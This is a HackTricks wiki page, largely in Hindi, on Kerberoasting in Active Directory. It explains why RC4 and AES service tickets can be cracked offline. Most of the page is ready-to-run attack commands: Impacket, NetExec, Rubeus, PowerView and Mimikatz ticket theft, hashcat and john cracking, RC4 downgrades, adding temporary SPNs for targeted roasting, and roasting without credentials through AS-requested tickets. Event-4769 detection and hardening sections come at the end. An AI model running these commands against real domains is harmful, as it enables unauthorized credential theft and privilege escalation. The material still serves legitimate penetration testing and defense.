# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting का focus TGS tickets प्राप्त करने पर होता है, विशेष रूप से उन services से संबंधित tickets पर जो Active Directory (AD) में user accounts के अंतर्गत चलती हैं, computer accounts को छोड़कर। इन tickets का encryption user passwords से उत्पन्न keys का उपयोग करता है, जिससे offline credential cracking संभव होती है। किसी user account को service के रूप में उपयोग किए जाने का संकेत non-empty ServicePrincipalName (SPN) property से मिलता है।

कोई भी authenticated domain user TGS tickets का अनुरोध कर सकता है, इसलिए किसी विशेष privilege की आवश्यकता नहीं होती।<sup>[[4]](#references)[[5]](#references)</sup>

### मुख्य बिंदु

- उन services के TGS tickets को target करता है जो user accounts के अंतर्गत चलती हैं (अर्थात, जिन accounts पर SPN set है; computer accounts नहीं)।
- Tickets को service account के password से derived key से encrypt किया जाता है और उन्हें offline crack किया जा सकता है।
- किसी elevated privilege की आवश्यकता नहीं; कोई भी authenticated account TGS tickets का अनुरोध कर सकता है।

> [!WARNING]
> अधिकांश public tools RC4-HMAC (etype 23) service tickets का अनुरोध करना पसंद करते हैं, क्योंकि इन्हें AES की तुलना में crack करना तेज़ होता है। RC4 TGS hashes `$krb5tgs$23$*` से शुरू होते हैं, AES128 `$krb5tgs$17$*` से और AES256 `$krb5tgs$18$*` से। हालांकि, कई environments AES-only की ओर बढ़ रहे हैं। यह न मानें कि केवल RC4 relevant है।
> साथ ही, “spray-and-pray” roasting से बचें। Rubeus का default kerberoast सभी SPNs के लिए query और tickets का अनुरोध कर सकता है और यह noisy होता है। पहले interesting principals को enumerate और target करें।

### Service account secrets और Kerberos crypto cost

कई services अब भी manually managed passwords वाले user accounts के अंतर्गत चलती हैं। KDC उन passwords से derived keys के साथ service tickets को encrypt करता है और ciphertext किसी भी authenticated principal को दे देता है, इसलिए kerberoasting lockouts या DC telemetry के बिना unlimited offline guesses की सुविधा देता है। Encryption mode cracking budget निर्धारित करता है:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt rainbow tables को रोकता है, लेकिन short passwords की fast cracking अब भी संभव रहती है। |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | AES की तुलना में ~1000× तेज़; जब `msDS-SupportedEncryptionTypes` इसकी अनुमति देता है, attackers RC4 force करते हैं। |

*Matthew Green's [Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) में Chick3nman के benchmarks के अनुसार।<sup>[[3]](#references)</sup>

RC4 का confounder केवल keystream को randomize करता है; यह प्रत्येक guess के लिए अतिरिक्त work नहीं जोड़ता। जब तक service accounts random secrets (gMSA/dMSA, machine accounts या vault-managed strings) पर निर्भर नहीं होते, compromise speed पूरी तरह GPU budget पर निर्भर करती है। AES-only etypes लागू करने से billion-guesses-per-second downgrade हट जाता है, लेकिन weak human passwords अब भी PBKDF2 के सामने गिर जाते हैं।<sup>[[3]](#references)</sup>

### Attack

#### Linux

NetExec का उपयोग करके roastable tickets का अनुरोध करने और Hashcat से उन्हें crack करने वाला एक practical end-to-end example reference [1] में उपलब्ध है।<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast checks सहित multi-feature tools:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- kerberoastable users को Enumerate करें
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGS के लिए request करें और memory से dump करें
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: स्वचालित टूल
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> एक TGS request Windows Security Event 4769 उत्पन्न करता है (एक Kerberos service ticket का अनुरोध किया गया)।

### OPSEC और केवल AES वाले environments

- बिना AES वाले accounts के लिए जानबूझकर RC4 request करें:
- Rubeus: `/rc4opsec` बिना AES वाले accounts को enumerate करने के लिए tgtdeleg का उपयोग करता है और RC4 service tickets request करता है।
- Rubeus: kerberoast के साथ `/tgtdeleg` उपयोग करने पर जहाँ संभव हो, RC4 requests भी trigger होती हैं।<sup>[[6]](#references)</sup>
- बिना silently fail हुए केवल AES वाले accounts को roast करें:
- Rubeus: `/aes` AES enabled वाले accounts को enumerate करता है और AES service tickets (etype 17/18) request करता है।
- यदि आपके पास पहले से TGT है (PTT या किसी .kirbi से), तो आप `/spn:<SPN>` या `/spns:<file>` के साथ `/ticket:<blob|path>` उपयोग कर सकते हैं और LDAP को skip कर सकते हैं।
- Targeting, throttling और कम noise:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` और `/jitter:<1-100>` का उपयोग करें।
- `/pwdsetbefore:<MM-dd-yyyy>` (पुराने passwords) का उपयोग करके संभावित रूप से weak passwords को filter करें या `/ou:<DN>` के साथ privileged OUs को target करें।<sup>[[8]](#references)</sup>

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

यदि आप किसी account को control करते हैं या उसमें बदलाव कर सकते हैं, तो SPN जोड़कर उसे kerberoastable बना सकते हैं:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
किसी account को Downgrade करके आसान cracking के लिए RC4 enable करें (target object पर write privileges आवश्यक हैं):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### किसी user पर GenericWrite/GenericAll के माध्यम से Targeted Kerberoast (temporary SPN)

जब BloodHound दिखाता है कि आपके पास किसी user object पर control है (जैसे, GenericWrite/GenericAll), तो आप उस specific user को reliably “targeted-roast” कर सकते हैं, भले ही उसके पास वर्तमान में कोई SPN न हो:<sup>[[9]](#references)</sup>

- controlled user में एक temporary SPN जोड़ें, ताकि वह roastable बन जाए।
- cracking को प्राथमिकता देने के लिए उस SPN हेतु RC4 (etype 23) से encrypted TGS-REP request करें।
- `$krb5tgs$23$...` hash को hashcat से crack करें।
- footprint कम करने के लिए SPN को हटा दें।

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py add SPN -> request TGS (etype 23) -> remove SPN को automate करता है):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
hashcat autodetect से output को crack करें (`$krb5tgs$23$` के लिए mode 13100):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: SPNs जोड़ने/हटाने से directory में बदलाव होते हैं (target user पर Event ID 5136/4738), और TGS request से Event ID 4769 उत्पन्न होता है। Throttling और prompt cleanup पर विचार करें।

Kerberoast attacks के लिए उपयोगी tools यहां मिल सकते हैं: https://github.com/nidem/kerberoast

यदि आपको Linux से यह error मिलता है: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, तो यह local time skew के कारण है। DC के साथ sync करें:

- `ntpdate <DC_IP>` (कुछ distros पर deprecated)
- `rdate -n <DC_IP>`

### domain account के बिना Kerberoast (AS-requested STs)

सितंबर 2022 में, Charlie Clark ने दिखाया कि यदि किसी principal को pre-authentication की आवश्यकता नहीं है, तो request body में sname बदलकर crafted KRB_AS_REQ के माध्यम से service ticket प्राप्त करना संभव है, जिससे प्रभावी रूप से TGT के बजाय service ticket मिलता है। यह AS-REP roasting जैसा है और इसके लिए valid domain credentials की आवश्यकता नहीं होती।

विवरण देखें: Semperis write-up “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> आपको users की एक list देनी होगी, क्योंकि valid credentials के बिना आप इस technique से LDAP query नहीं कर सकते।

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
संबंधित

यदि आप AS-REP roastable users को target कर रहे हैं, तो यह भी देखें:

{{#ref}}
asreproast.md
{{#endref}}

### Detection

Kerberoasting stealthy हो सकता है। शोर कम करने के लिए DCs से Event ID 4769 की तलाश करें और filters लागू करें:

- service name `krbtgt` और `$` पर समाप्त होने वाले service names (computer accounts) को exclude करें।
- machine accounts (`*$$@*`) से आने वाले requests को exclude करें।
- केवल successful requests (Failure Code `0x0`)।
- encryption types track करें: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`)। केवल `0x17` पर alert न करें।

उदाहरण PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Additional ideas:

- प्रति host/user सामान्य SPN usage का baseline बनाएँ; एक ही principal से distinct SPN requests के बड़े bursts पर alert करें।
- AES-hardened domains में असामान्य RC4 usage को flag करें।

### Mitigation / Hardening

- Services के लिए gMSA/dMSA या machine accounts का उपयोग करें। Managed accounts में 120+ characters वाले random passwords होते हैं और वे automatically rotate होते हैं, जिससे offline cracking अव्यावहारिक हो जाती है।<sup>[[7]](#references)</sup>
- Service accounts पर AES enforce करें: `msDS-SupportedEncryptionTypes` को केवल AES पर सेट करें (decimal 24 / hex 0x18), फिर password rotate करें ताकि AES keys derive हों।<sup>[[7]](#references)</sup>
- जहाँ संभव हो, अपने environment में RC4 disable करें और attempted RC4 usage को monitor करें। DCs पर `DefaultDomainSupportedEncTypes` registry value का उपयोग उन accounts के defaults निर्धारित करने के लिए कर सकते हैं जिनमें `msDS-SupportedEncryptionTypes` set नहीं है। Thorough testing करें।
- User accounts से अनावश्यक SPNs हटाएँ।<sup>[[7]](#references)</sup>
- यदि managed accounts feasible नहीं हैं, तो लंबे और random service account passwords (25+ chars) का उपयोग करें; common passwords को ban करें और नियमित रूप से audit करें।<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Legacy Kerberos Crypto से Low-Tech, High-Impact Attacks (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberos पर attack कैसे करें?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: AES Enabled होने पर RC4 Encrypted TGS Request करना](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Kerberoasting को mitigate करने में सहायता के लिए Microsoft की guidance](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast command documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – New Attack Paths? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
